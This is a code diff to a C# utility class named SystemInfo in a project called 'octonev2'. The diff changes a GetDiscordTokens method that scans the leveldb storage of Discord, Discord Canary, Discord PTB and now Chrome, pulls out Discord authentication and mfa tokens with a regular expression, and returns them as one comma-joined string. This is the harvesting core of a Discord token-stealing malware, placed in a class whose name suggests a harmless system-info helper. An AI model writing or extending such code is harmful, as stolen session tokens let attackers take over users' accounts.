@@ -10,14 +10,17 @@ namespace octonev2.Utils
 {
     public static class SystemInfo
     {
-        public static async Task<List<string>> GetDiscordTokens()
+        public static string GetDiscordTokens()
         {
             var tokens = new List<string>();
-            var paths = new[]
-            {
-        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord\\Local Storage\\leveldb"),
-        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary\\Local Storage\\leveldb"),
-        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb\\Local Storage\\leveldb")
+            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+            var paths = new[] {
+        Path.Combine(roamingAppData, "Discord", "Local Storage", "leveldb"),
+        Path.Combine(roamingAppData, "discordcanary", "Local Storage", "leveldb"),
+        Path.Combine(roamingAppData, "discordptb", "Local Storage", "leveldb"),
+        Path.Combine(localAppData, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
     };
 
             foreach (var path in paths)
@@ -26,27 +29,16 @@ namespace octonev2.Utils
                 {
                     foreach (var file in Directory.GetFiles(path, "*.ldb"))
                     {
-                        try
+                        string content = File.ReadAllText(file);
+                        foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                         {
-                            string content = await File.ReadAllTextAsync(file);
-                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");
-
-                            foreach (Match match in matches)
-                            {
-                                if (!tokens.Contains(match.Value))
-                                {
-                                    tokens.Add(match.Value);
-                                }
-                            }
-                        }
-                        catch
-                        {
-                            continue;
+                            tokens.Add(match.Value);
                         }
                     }
                 }
             }
-            return tokens;
+
+            return string.Join(",", tokens.Distinct());
         }
 
 
